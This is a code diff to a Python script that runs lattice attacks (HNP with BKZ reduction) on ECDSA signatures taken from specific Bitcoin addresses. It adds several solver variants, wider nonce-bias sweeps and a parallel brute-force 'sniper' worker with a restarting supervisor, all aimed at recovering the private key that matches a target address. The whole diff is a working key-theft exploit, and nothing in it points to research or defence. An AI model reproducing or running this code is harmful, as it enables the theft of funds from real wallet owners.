@@ -1,7 +1,11 @@
 import requests
 import time
+import datetime
 import subprocess
 import json
+import multiprocessing
+import os
+import sys
 import ecdsa
 from ecdsa import VerifyingKey, SECP256k1
 from bitcoinutils.transactions import Transaction
@@ -602,7 +606,7 @@ def verify_all_standards(private_key_int, target_address):
             check = hashlib.sha256(hashlib.sha256(net).digest()).digest()[:4]
             # Base58
             addr = base58.b58encode(net + check).decode()
-            print(addr)
+            # print(addr)
             if addr.lower() == target_address.lower():
                 return True
     except Exception as e:
@@ -920,7 +924,7 @@ def solve_msb_lattice(signatures, target_address):
     print(f"[*] Analyzing {m} biased inputs with 512-bit precision...")
 
     # We test the dominant 0x47 bias (1-bit) and the anchor 0x46 (9-bit)
-    for bias_bits in [9, 1]: 
+    for bias_bits in [9, 8,  7,6,5, 4, 3]: 
         B = 2**(256 - bias_bits)
         scale = N // B
         # L = Matrix(QQ, m + 2, m + 2)
@@ -930,7 +934,8 @@ def solve_msb_lattice(signatures, target_address):
         for i, sig in enumerate(signatures):
             z, r, s_raw = int(sig['z'], 16), int(sig['r'], 16), int(sig['s'], 16)
             # Normalizing S for 2012 malleability
-            s = s_raw if s_raw <= N // 2 else N - s_raw
+            # s = s_raw if s_raw <= N // 2 else N - s_raw
+            s = s_raw
             normalized_sigs.append((z,r,s))
             s_inv = pow(s, -1, N)
             t_i = (r * s_inv) % N
@@ -961,6 +966,13 @@ def solve_msb_lattice(signatures, target_address):
                         print(f"\n[!!!] SNIPER SUCCESS: {hex(cand + drift)}")
                         print(f"\n[!!!] SNIPER SUCCESS:")
                         return hex(cand + drift)
+            cand = abs(int(row[m+1])) % N
+            if cand > 1:
+                for drift in range(-300, 310):
+                    if verify_all_standards(cand + drift, target_address):
+                        print(f"\n[!!!] SNIPER SUCCESS: {hex(cand + drift)}")
+                        print(f"\n[!!!] SNIPER SUCCESS:")
+                        return hex(cand + drift)
             for i in range(m):
                 k_base = abs(int(row[i])) % N
                 if k_base <= 1: continue
@@ -975,7 +987,8 @@ def solve_msb_lattice(signatures, target_address):
                         (s * k_cand - z) * r_inv % N,
                         (s * k_cand + z) * r_inv % N,
                         (s * (N - k_cand) - z) * r_inv % N,
-                        (s * (N - k_cand) + z) * r_inv % N
+                        (s * (N - k_cand) + z) * r_inv % N,
+                        k_cand
                     ]
                     for t_cand in d_candidates:
                         if verify_all_standards(t_cand, target_address):
@@ -993,65 +1006,152 @@ def solve_recovery_perfected_v5(signatures, target_address):
     m = len(signatures)
     
     # We use the dominant 3-bit / 4-bit bias for the base matrix stability
-    base_bias = 9
-    B_base = 2**(256 - base_bias)
-    scale_base = N // B_base
-    
-    L = IntegerMatrix(m + 2, m + 2)
-    normalized_sigs = []
-
-    print(f"[*] [12:45 AM] Initializing Weighted Event Horizon Matrix...")
-
-    for i, sig in enumerate(signatures):
-        z, r, s_raw = int(sig['z'], 16), int(sig['r'], 16), int(sig['s'], 16)
-        s = s_raw if s_raw <= N // 2 else N - s_raw
-        normalized_sigs.append((z, r, s))
+    # base_bias = 4
+    for base_bias in [9, 8,  7, 6, 5, 4, 3]:
+        B_base = 2**(256 - base_bias)
+        scale_base = N // B_base
         
+        L = IntegerMatrix(m + 2, m + 2)
+        normalized_sigs = []
+
+        print(f"[*] [12:45 AM] Initializing Weighted Event Horizon Matrix...")
+
+        for i, sig in enumerate(signatures):
+            z, r, s_raw = int(sig['z'], 16), int(sig['r'], 16), int(sig['s'], 16)
+            # s = s_raw if s_raw <= N // 2 else N - s_raw
+            s = s_raw
+            normalized_sigs.append((z, r, s))
+            
+            s_inv = pow(s, -1, N)
+            t_i = (r * s_inv) % N
+            u_i = (z * s_inv) % N
+            
+            # DYNAMIC WEIGHTING: 
+            # We calculate specific bias for each sig to adjust diagonal importance.
+            current_bias = 256 - r.bit_length()
+            B_i = 2**(256 - current_bias)
+            
+            # Logic: High bias (9-bit) gets a much 'shorter' entry (L[i,i])
+            # This makes the solver treat these 3 anchors with 32x-64x more priority.
+            weight_multiplier = 2**(current_bias - base_bias)
+            L[i, i] = (N * scale_base) // max(1, weight_multiplier)
+            # L[i, i] = (N * scale_base)
+            L[m, i] = t_i * scale_base
+            
+            # Centering the noise based on the specific bias of THIS signature
+            L[m + 1, i] = (u_i - (B_i // 2)) * scale_base
+            # L[m + 1, i] = (u_i - (B_base // 2)) * scale_base
+            
+        L[m, m] = 1
+        L[m + 1, m + 1] = B_base // 2
+
+        # Reduction Block
+        FPLLL.set_precision(256)
+        gso = GSO.Mat(L, float_type="mpfr")
+        gso.update_gso()
+        
+        print("[*] Reducing 32-dim Weighted Lattice (BKZ-40)...")
+        BKZ.Reduction(gso, LLL.Reduction(gso), BKZ.Param(block_size=40, flags=BKZ.VERBOSE))()
+
+        # EXTRACTION: Searching Drift ±300 around all candidates
+        print("[*] Reduction complete. Running Sniper & Event Horizon Loops...")
+        
+        for row in L:
+            cand_d = abs(int(row[m])) % N
+            if cand_d > 1:
+                for drift in range(-300, 310):
+                    if verify_all_standards(cand_d + drift, target_address):
+                        print(cand_d + drift)
+                        return f"SNIPER SUCCESS: {hex(cand_d + drift)}"
+            cand_d = abs(int(row[m+1])) % N
+            if cand_d > 1:
+                for drift in range(-300, 310):
+                    if verify_all_standards(cand_d + drift, target_address):
+                        print(cand_d + drift)
+                        return f"SNIPER SUCCESS: {hex(cand_d + drift)}"
+            
+            # Deep Nonce Extraction
+            for i in range(m):
+                k_base = abs(int(row[i])) % N
+                if k_base <= 1: continue
+                z, r, s = normalized_sigs[i]
+                r_inv = pow(r, -1, N)
+                for drift in range(-300, 301):
+                    k_cand = (k_base + drift) % N
+                    # Standard 4-variant coverage
+                    for d_cand in [(s*k_cand-z)*r_inv%N, (s*k_cand+z)*r_inv%N, (s*(N-k_cand)-z)*r_inv%N, (s*(N-k_cand)+z)*r_inv%N, k_cand]:
+                        if verify_all_standards(d_cand, target_address):
+                            print(d_cand)
+                            return f"EVENT HORIZON SUCCESS: {hex(d_cand)}"
+
+    return "Pass complete. Matrix fully reduced."
+
+def solve_hnp_final_2012(signatures, target_address):
+    """
+    Final Integrated HNP Solver: Nov-Dec 2012 'Golden Window' Cluster.
+    Architecture: Strict Zero-Padding (Non-Uniform MSB Bias)
+    Refined: Thursday, June 18, 2026, 01:49 AM CDT
+    """
+    m = len(signatures)
+    scale_base = 2**160
+    B_base = 2**250 # Base bound for 6-bit leaks
+
+    # 1. MATRIX CONSTRUCTION
+    L = IntegerMatrix(m + 2, m + 2)
+    print(f"[*] [{datetime.datetime.now().strftime('%H:%M:%S')}] Building 2012-Strict-Zero Lattice...")
+    normalized_sigs = []
+    for i, sig in enumerate(signatures):
+        z, r, s = int(sig['z'], 16), int(sig['r'], 16), int(sig['s'], 16)
+        normalized_sigs.append((z, r, s))
         s_inv = pow(s, -1, N)
         t_i = (r * s_inv) % N
         u_i = (z * s_inv) % N
         
-        # DYNAMIC WEIGHTING: 
-        # We calculate specific bias for each sig to adjust diagonal importance.
-        current_bias = 256 - r.bit_length()
-        B_i = 2**(256 - current_bias)
+        # VARIABLE BIAS WEIGHTING
+        # Row 0: 10-bit | Row 1-2: 8-bit | Row 3+: 6-bit
+        if i == 0: current_bias = 10
+        elif i < 3: current_bias = 8
+        else: current_bias = 6
+            
+        weight_multiplier = 2**(current_bias - 6)
         
-        # Logic: High bias (9-bit) gets a much 'shorter' entry (L[i,i])
-        # This makes the solver treat these 3 anchors with 32x-64x more priority.
-        weight_multiplier = 2**(current_bias - base_bias)
-        # L[i, i] = (N * scale_base) // max(1, weight_multiplier)
-        L[i, i] = (N * scale_base)
-        L[m, i] = t_i * scale_base
-        
-        # Centering the noise based on the specific bias of THIS signature
-        # L[m + 1, i] = (u_i - (B_i // 2)) * scale_base
-        L[m + 1, i] = (u_i - (B_base // 2)) * scale_base
-        
-    L[m, m] = 1
-    L[m + 1, m + 1] = B_base // 2
+        L[i, i] = (N * scale_base) // max(1, weight_multiplier)
+        L[m, i] = (t_i * scale_base)
+        # STRICT ZERO-PADDING: No centering offset (-B/2)
+        L[m + 1, i] = u_i * scale_base 
 
-    # Reduction Block
+    L[m, m] = 1
+    L[m + 1, m + 1] = B_base
+
+    # 2. HIGH-PRECISION REDUCTION
+    print(f"[*] Starting BKZ-60 Reduction with MPFR-256 precision...")
     FPLLL.set_precision(256)
     gso = GSO.Mat(L, float_type="mpfr")
-    gso.update_gso()
+    # gso.update_gso()
     
-    print("[*] Reducing 32-dim Weighted Lattice (BKZ-40)...")
+    # Run Reduction
     BKZ.Reduction(gso, LLL.Reduction(gso), BKZ.Param(block_size=40, flags=BKZ.VERBOSE))()
 
-    # EXTRACTION: Searching Drift ±300 around all candidates
-    print("[*] Reduction complete. Running Sniper & Event Horizon Loops...")
-    
+    # 3. SNIPER EXTRACTION WITH REFLECTION CHECK
+    print(f"[*] [{datetime.datetime.now().strftime('%H:%M:%S')}] Reduction complete. Scanning candidates...")
+
     for row in L:
         cand_d = abs(int(row[m])) % N
         if cand_d > 1:
-            for drift in range(-300, 310):
-                if verify_all_standards(cand_d + drift, target_address):
-                    return f"SNIPER SUCCESS: {hex(cand_d + drift)}"
+            for drift in range(-500, 510):
+                k_base = cand_d + drift
+                for d_cand in [k_base, N - k_base]:
+                    if verify_all_standards(d_cand, target_address):
+                        print(d_cand)
+                        return f"SNIPER SUCCESS: {hex(d_cand)}"
         cand_d = abs(int(row[m+1])) % N
         if cand_d > 1:
-            for drift in range(-300, 310):
-                if verify_all_standards(cand_d + drift, target_address):
-                    return f"SNIPER SUCCESS: {hex(cand_d + drift)}"
+            for drift in range(-500, 510):
+                k_base = cand_d + drift
+                for d_cand in [k_base, N - k_base]:
+                    if verify_all_standards(d_cand, target_address):
+                        print(d_cand)
+                        return f"SNIPER SUCCESS: {hex(d_cand)}"
         
         # Deep Nonce Extraction
         for i in range(m):
@@ -1059,14 +1159,279 @@ def solve_recovery_perfected_v5(signatures, target_address):
             if k_base <= 1: continue
             z, r, s = normalized_sigs[i]
             r_inv = pow(r, -1, N)
-            for drift in range(-300, 301):
+            for drift in range(-500, 501):
                 k_cand = (k_base + drift) % N
                 # Standard 4-variant coverage
-                for d_cand in [(s*k_cand-z)*r_inv%N, (s*k_cand+z)*r_inv%N, (s*(N-k_cand)-z)*r_inv%N, (s*(N-k_cand)+z)*r_inv%N]:
+                for d_cand in [(s*k_cand-z)*r_inv%N, (s*k_cand+z)*r_inv%N, (s*(N-k_cand)-z)*r_inv%N, (s*(N-k_cand)+z)*r_inv%N, k_cand, N-k_cand]:
                     if verify_all_standards(d_cand, target_address):
+                        print(d_cand)
                         return f"EVENT HORIZON SUCCESS: {hex(d_cand)}"
+    return False
 
-    return "Pass complete. Matrix fully reduced."
+def get_bias_bits(r_hex):
+    """Forensic bias detector: calculates leading zero bits in the r-value."""
+    r_val = int(r_hex, 16)
+    r_bin = bin(r_val)[2:].zfill(256)
+    return len(r_bin) - len(r_bin.lstrip('0'))
+
+def solve_54_signatures_turbo(signatures, target_address):
+    """
+    Final Integrated HNP Solver: Nov-Dec 2012 'Golden Window' Cluster.
+    Architecture: Strict Zero-Padding (Non-Uniform MSB Bias)
+    Refined: Thursday, June 18, 2026, 01:49 AM CDT
+    """
+    m = len(signatures)
+    scale_base = 2**182
+    B_base = 2**250 # Base bound for 6-bit leaks
+
+    FPLLL.set_precision(512)
+    # 1. MATRIX CONSTRUCTION
+    L = IntegerMatrix(m + 2, m + 2)
+    print(f"[*] [{datetime.datetime.now().strftime('%H:%M:%S')}] Building 2012-Strict-Zero Lattice...")
+    normalized_sigs = []
+    for i, sig in enumerate(signatures):
+        z, r, s = int(sig['z'], 16), int(sig['r'], 16), int(sig['s'], 16)
+        normalized_sigs.append((z, r, s))
+        s_inv = pow(s, -1, N)
+        t_i = (r * s_inv) % N
+        u_i = (z * s_inv) % N
+        
+        # VARIABLE BIAS WEIGHTING
+        # Row 0: 10-bit | Row 1-2: 8-bit | Row 3+: 6-bit
+        bias = get_bias_bits(sig['r'])
+        weight_multiplier = 2**(bias - 4)
+        
+        L[i, i] = (N * scale_base) // max(1, weight_multiplier)
+        L[m, i] = (t_i * scale_base)
+        # STRICT ZERO-PADDING: No centering offset (-B/2)
+        L[m + 1, i] = u_i * scale_base 
+
+    L[m, m] = 1
+    L[m + 1, m + 1] = B_base
+
+    # 2. HIGH-PRECISION REDUCTION
+    print(f"[*] Starting BKZ-60 Reduction with MPFR-256 precision...")
+    
+    gso = GSO.Mat(L, float_type="mpfr")
+    # gso.update_gso()
+    
+    # Run Reduction
+    BKZ.Reduction(gso, LLL.Reduction(gso), BKZ.Param(block_size=48, flags=BKZ.VERBOSE))()
+
+    # 3. SNIPER EXTRACTION WITH REFLECTION CHECK
+    print(f"[*] [{datetime.datetime.now().strftime('%H:%M:%S')}] Reduction complete. Scanning candidates...")
+
+    for row in L:
+        cand_d = abs(int(row[m])) % N
+        if cand_d > 1:
+            for drift in range(-2000, 2001):
+                k_base = cand_d + drift
+                for d_cand in [k_base, N - k_base]:
+                    if verify_all_standards(d_cand, target_address):
+                        print(d_cand)
+                        return f"SNIPER SUCCESS: {hex(d_cand)}"
+        cand_d = abs(int(row[m+1])) % N
+        if cand_d > 1:
+            for drift in range(-2000, 2001):
+                k_base = cand_d + drift
+                for d_cand in [k_base, N - k_base]:
+                    if verify_all_standards(d_cand, target_address):
+                        print(d_cand)
+                        return f"SNIPER SUCCESS: {hex(d_cand)}"
+        
+        # Deep Nonce Extraction
+        for i in range(m):
+            k_base = abs(int(row[i])) % N
+            if k_base <= 1: continue
+            z, r, s = normalized_sigs[i]
+            r_inv = pow(r, -1, N)
+            for drift in range(-2000, 2001):
+                k_cand = (k_base + drift) % N
+                # Standard 4-variant coverage
+                for d_cand in [(s*k_cand-z)*r_inv%N, (s*k_cand+z)*r_inv%N, (s*(N-k_cand)-z)*r_inv%N, (s*(N-k_cand)+z)*r_inv%N, k_cand, N-k_cand]:
+                    if verify_all_standards(d_cand, target_address):
+                        print(d_cand)
+                        return f"EVENT HORIZON SUCCESS: {hex(d_cand)}"
+    return False
+
+def sniper_worker(start, end, k_base, z, r_inv, s, target_pubkey, found_event, result_queue):
+    """
+    High-Performance Worker: Bridges 2012 Java PRNG jitter with 4-variant testing.
+    """
+    try:
+        pid = os.getpid()
+        for drift in range(start, end):
+            if found_event.is_set(): return
+            
+            k_cand = (k_base + drift) % N
+            
+            # The 4 Critical Sign Variants to bridge ECDSA ambiguities
+            variants = [
+                (s * k_cand - z) * r_inv % N,        # Standard
+                (s * k_cand + z) * r_inv % N,        # s-negative
+                (s * (N - k_cand) - z) * r_inv % N,  # k-reflection
+                (s * (N - k_cand) + z) * r_inv % N,   # Double-negative
+                k_cand,
+                N - k_cand
+            ]
+            
+            for d_cand in variants:
+                if verify_all_standards(d_cand, target_pubkey):
+                    print(d_cand)
+                    result_queue.put(hex(d_cand))
+                    found_event.set()
+                    return
+            
+            if drift % 100000 == 0:
+                print(f"[*] [12:20 AM] Core {pid} @ drift {drift}")
+                
+    except Exception as e:
+        sys.exit(1) # Supervisor will catch non-zero exit and re-spawn
+
+def solve_54_signatures_centered(signatures, target_address):
+    """
+    Final Integrated HNP Solver: Nov-Dec 2012 'Golden Window' Cluster.
+    Architecture: Strict Zero-Padding (Non-Uniform MSB Bias)
+    Refined: Thursday, June 18, 2026, 01:49 AM CDT
+    """
+    m = len(signatures)
+    scale_base = 2**180
+    B_base = 2**250 # Base bound for 6-bit leaks
+
+    FPLLL.set_precision(2048)
+    # 1. MATRIX CONSTRUCTION
+    L = IntegerMatrix(m + 2, m + 2)
+    print(f"[*] [{datetime.datetime.now().strftime('%H:%M:%S')}] Building 2012-Strict-Zero Lattice...")
+    normalized_sigs = []
+    for i, sig in enumerate(signatures):
+        z, r, s = int(sig['z'], 16), int(sig['r'], 16), int(sig['s'], 16)
+        normalized_sigs.append((z, r, s))
+        s_inv = pow(s, -1, N)
+        t_i = (r * s_inv) % N
+        u_i = (z * s_inv) % N
+        
+        # VARIABLE BIAS WEIGHTING
+        # Row 0: 10-bit | Row 1-2: 8-bit | Row 3+: 6-bit
+        bias = get_bias_bits(sig['r'])
+        weight_multiplier = 2**(bias - 4)
+        
+        centered_ui = (u_i + (N // (2**(bias + 1)))) % N
+        
+        L[i, i] = (N * scale_base) // max(1, weight_multiplier)
+        L[m, i] = (t_i * scale_base)
+        L[m + 1, i] = (centered_ui * scale_base)
+
+    L[m, m] = 1
+    L[m + 1, m + 1] = B_base
+
+    # 2. HIGH-PRECISION REDUCTION
+    print(f"[*] Starting BKZ-60 Reduction with MPFR-256 precision...")
+    
+    gso = GSO.Mat(L, float_type="mpfr")
+    # gso.update_gso()
+    
+    # Run Reduction
+    BKZ.Reduction(gso, LLL.Reduction(gso), BKZ.Param(block_size=48, flags=BKZ.VERBOSE))()
+
+    # 3. SNIPER EXTRACTION WITH REFLECTION CHECK
+    print(f"[*] [{datetime.datetime.now().strftime('%H:%M:%S')}] Reduction complete. Scanning candidates...")
+    num_cores = multiprocessing.cpu_count()
+    drift_radius = 500000 # 1M point window
+    
+    # We rotate the anchor if Sig 0 is corrupted (Elite Safeguard)
+    for anchor_idx in [0, 1]:
+        # anchor = signatures[anchor_idx]
+        # az, ar, asig = int(anchor['z'], 16), int(anchor['r'], 16), int(anchor['s'], 16)
+        az, ar, asig = normalized_sigs[anchor_idx]
+        ar_inv = pow(ar, -1, N)
+        
+        print(f"[*] [12:20 AM] Sniping Matrix via Anchor Index {anchor_idx}...")
+
+        for row_idx in range(L.nrows):
+            # Only check high-probability columns m-1 and m
+            for col_idx in range(m-2, m+2):
+                k_base = abs(int(L[row_idx, col_idx])) % N
+                if k_base <= 1: continue
+                
+                found_event = multiprocessing.Event()
+                result_queue = multiprocessing.Queue()
+                active_tasks = []
+                chunk = (2 * drift_radius) // num_cores
+
+                for i in range(num_cores):
+                    start = -drift_radius + (i * chunk)
+                    end = start + chunk if i < num_cores - 1 else drift_radius + 1
+                    p = multiprocessing.Process(target=sniper_worker, 
+                                                args=(start, end, k_base, az, ar_inv, asig, 
+                                                      target_address, found_event, result_queue))
+                    active_tasks.append({'process': p, 'range': (start, end)})
+                    p.start()
+
+                # Self-Healing Supervisor Loop
+                while active_tasks and not found_event.is_set():
+                    for task in active_tasks[:]:
+                        p = task['process']
+                        if not p.is_alive():
+                            if p.exitcode != 0 and not found_event.is_set():
+                                s_chunk, e_chunk = task['range']
+                                print(f"[!] Core {p.pid} failed. Re-spawning range {s_chunk}:{e_chunk}")
+                                time.sleep(5)
+                                new_p = multiprocessing.Process(target=sniper_worker, 
+                                                            args=(s_chunk, e_chunk, k_base, az, ar_inv, asig, 
+                                                                  target_address, found_event, result_queue))
+                                task['process'] = new_p
+                                new_p.start()
+                            else:
+                                active_tasks.remove(task)
+                    
+                    if not result_queue.empty():
+                        key = result_queue.get()
+                        print(f"\n[!!!] 12:20 AM RECOVERY SUCCESS: {key}")
+                        for t in active_tasks: t['process'].terminate()
+                        return key
+                    time.sleep(1)
+    # return
+    # for row in L:
+    #     cand_d = abs(int(row[m])) % N
+    #     if cand_d > 1:
+    #         for drift in range(-5000, 5001):
+    #             k_base = cand_d + drift
+    #             for d_cand in [k_base, N - k_base]:
+    #                 if verify_all_standards(d_cand, target_address):
+    #                     print(d_cand)
+    #                     return f"SNIPER SUCCESS: {hex(d_cand)}"
+    #     cand_d = abs(int(row[m+1])) % N
+    #     if cand_d > 1:
+    #         for drift in range(-5000, 5001):
+    #             k_base = cand_d + drift
+    #             for d_cand in [k_base, N - k_base]:
+    #                 if verify_all_standards(d_cand, target_address):
+    #                     print(d_cand)
+    #                     return f"SNIPER SUCCESS: {hex(d_cand)}"
+        
+    #     # Deep Nonce Extraction
+    #     for i in range(m):
+    #         k_base = abs(int(row[i])) % N
+    #         if k_base <= 1: continue
+    #         z, r, s = normalized_sigs[i]
+    #         r_inv = pow(r, -1, N)
+    #         for drift in range(-5000, 5001):
+    #             k_cand = (k_base + drift) % N
+    #             # Standard 4-variant coverage
+    #             for d_cand in [(s*k_cand-z)*r_inv%N, (s*k_cand+z)*r_inv%N, (s*(N-k_cand)-z)*r_inv%N, (s*(N-k_cand)+z)*r_inv%N, k_cand, N-k_cand]:
+    #                 if verify_all_standards(d_cand, target_address):
+    #                     print(d_cand)
+    #                     return f"EVENT HORIZON SUCCESS: {hex(d_cand)}"
+    return False
+
+def get_words():
+    wordsList = []
+    if wordsList == []:
+        content_string = ""
+        with open("test.txt", "r") as f:
+            content_string = f.read()
+        wordsList = content_string.split("\n")
+    return wordsList
                     
 if __name__ == "__main__":
     # Example:
@@ -1085,18 +1450,34 @@ if __name__ == "__main__":
     # address = "16fXTTLZRft6eWb32zSihvGXSgZ6QmDQBB"
     # report = detect_vulnerable_software(address)
     # print(report)
-    allHistory = get_full_history(address)
-    result, r_du, totalCnt = extract_rsz_data(allHistory, address)
+    
+    result = []
+    totalCnt = 0
+    # allHistory = get_full_history(address)
+    # result, r_du, totalCnt = extract_rsz_data(allHistory, address)
+
+    words = get_words()
+    for word in words:
+        result.append(json.loads(word))
+        
+
     verfiedCnt = 0
     top45List = []
     top46List = []
     good47List = []
+    bigScnt = 0
+    totalBias =0
     for entity in result:
         res = verify_sig_integrity(entity['r'], entity['s'], entity['z'], entity['pubkey'])
         if res:
             # print(entity)
+            bias = get_bias_bits(entity['r'])
+            totalBias += bias
             verfiedCnt += 1
         # print(res)
+    print(bigScnt)
+    print(totalBias)
+    print(len(result))
     for i in range(0, len(result)):
         for j in range(0, len(result)):
             if int(result[i]['r'], 16) < int(result[j]['r'], 16):
@@ -1104,7 +1485,7 @@ if __name__ == "__main__":
                 result[i] = result[j]
                 result[j] = temp
     print(len(result), "-", verfiedCnt, "-", totalCnt)
-    print(len(r_du))
+    # print(len(r_du))
     # for entity in result:
     #     with open("1BezrM7zLYP9R4MwUHdHt89Va8pdYvpv3Y.txt", "a") as file:
     #         file.write(json.dumps(entity)+'\n')
@@ -1112,11 +1493,17 @@ if __name__ == "__main__":
         # print(int(entity['r'], 16)%2)
     
     # res = solve_event_horizon(result, address)
-    # res = solve_msb_lattice(result[0:30], address)
+    # res = solve_msb_lattice(result[0:59], address)
     # print(res)
 
     # res = solve_recovery_perfected_v5(result[0:59], address)
-    # print(res)
+    # res = solve_hnp_final_2012(result, address)
+    # res = solve_54_signatures_turbo(result, address)
+    res = solve_54_signatures_centered(result, address)
+    
+    print(res)
+
+    
 
     # verify_all_standards('39685648753016824787952881909322793904596734009504857818589497891815035', address)
 
